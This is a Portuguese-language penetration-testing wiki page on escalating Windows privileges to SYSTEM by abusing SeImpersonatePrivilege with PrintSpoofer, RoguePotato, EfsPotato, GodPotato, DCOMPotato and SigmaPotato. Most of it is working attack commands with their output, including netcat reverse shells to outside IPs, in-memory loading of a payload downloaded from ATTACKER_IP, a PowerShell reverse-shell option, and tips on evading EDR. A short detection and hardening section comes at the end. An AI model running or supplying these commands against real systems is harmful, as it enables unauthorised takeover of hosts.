# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato não funciona** em Windows Server 2019 e Windows 10 build 1809 em diante. No entanto, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** podem ser usados para obter os mesmos privilégios e ganhar acesso em nível `NT AUTHORITY\SYSTEM`.** Este [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) aprofunda-se na ferramenta `PrintSpoofer`, que pode ser usada para abusar de privilégios de impersonation em hosts Windows 10 e Server 2019 onde o JuicyPotato não funciona mais.

> [!TIP]
> Uma alternativa moderna frequentemente mantida em 2024–2025 é SigmaPotato (um fork do GodPotato) que adiciona uso em memória/.NET reflection e suporte estendido de SO. Veja uso rápido abaixo e o repo em References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requisitos e armadilhas comuns

Todas as técnicas a seguir dependem de abusar de um serviço privilegiado com capacidade de impersonation a partir de um contexto que detenha um destes privilégios:

- SeImpersonatePrivilege (o mais comum) ou SeAssignPrimaryTokenPrivilege
- Integridade elevada não é necessária se o token já tiver SeImpersonatePrivilege (típico para muitas contas de serviço como IIS AppPool, MSSQL, etc.)

Verifique os privilégios rapidamente:
```cmd
whoami /priv | findstr /i impersonate
```
Notas operacionais:

- Se sua shell estiver rodando sob um token restrito sem SeImpersonatePrivilege (comum para Local Service/Network Service em alguns contextos), recupere os privilégios padrão da conta usando FullPowers e então execute um Potato. Exemplo: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer requer o serviço Print Spooler em execução e acessível pelo endpoint RPC local (spoolss). Em ambientes reforçados onde o Spooler foi desabilitado após o PrintNightmare, prefira RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato requer um OXID resolver acessível via TCP/135. Se egress estiver bloqueado, use um redirector/port-forwarder (veja o exemplo abaixo). Versões mais antigas precisavam da flag -f.
- EfsPotato/SharpEfsPotato abusam de MS-EFSR; se um pipe estiver bloqueado, tente pipes alternativos (lsarpc, efsrpc, samr, lsass, netlogon).
- O erro 0x6d3 durante RpcBindingSetAuthInfo normalmente indica um serviço de autenticação RPC desconhecido/não suportado; tente um pipe/transporte diferente ou garanta que o serviço alvo esteja em execução.

## Demonstração rápida

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Notas:
- Você pode usar -i para iniciar um processo interativo no console atual, ou -c para executar um one-liner.
- Requer o serviço Spooler. Se desativado, isso falhará.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Se o tráfego de saída pela porta 135 estiver bloqueado, encaminhe o OXID resolver via socat no seu redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Dica: Se um pipe falhar ou o EDR o bloquear, tente os outros pipes suportados:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Notas:
- Funciona em Windows 8/8.1–11 e Server 2012–2022 quando SeImpersonatePrivilege está presente.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato fornece duas variantes que miram objetos DCOM de serviço que por padrão usam RPC_C_IMP_LEVEL_IMPERSONATE. Compile ou use os binários fornecidos e execute seu comando:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (fork atualizado do GodPotato)

SigmaPotato adiciona funcionalidades modernas, como execução em memória via .NET reflection e um auxiliar de reverse shell em PowerShell.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## Notas de detecção e hardening

- Monitore processos que criam named pipes e imediatamente chamam APIs de duplicação de token seguidas por CreateProcessAsUser/CreateProcessWithTokenW. O Sysmon pode expor telemetria útil: Event ID 1 (criação de processo), 17/18 (named pipe criado/conectado) e linhas de comando que geram processos filhos como SYSTEM.
- Spooler hardening: Desabilitar o serviço Print Spooler em servidores onde não é necessário previne coerções locais ao estilo PrintSpoofer via spoolss.
- Service account hardening: Minimize a atribuição de SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege a serviços customizados. Considere executar serviços sob contas virtuais com os menores privilégios necessários e isolá-los com service SID e tokens com permissão de escrita restrita quando possível.
- Controles de rede: Bloquear TCP/135 de saída ou restringir o tráfego do RPC endpoint mapper pode quebrar RoguePotato a menos que um redirector interno esteja disponível.
- EDR/AV: Todas essas ferramentas têm assinaturas amplamente conhecidas. Recompilar a partir do source, renomear símbolos/strings ou usar execução em memória pode reduzir a detecção, mas não derrotará detecções comportamentais robustas.

## Referências

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)

{{#include ../../banners/hacktricks-training.md}}
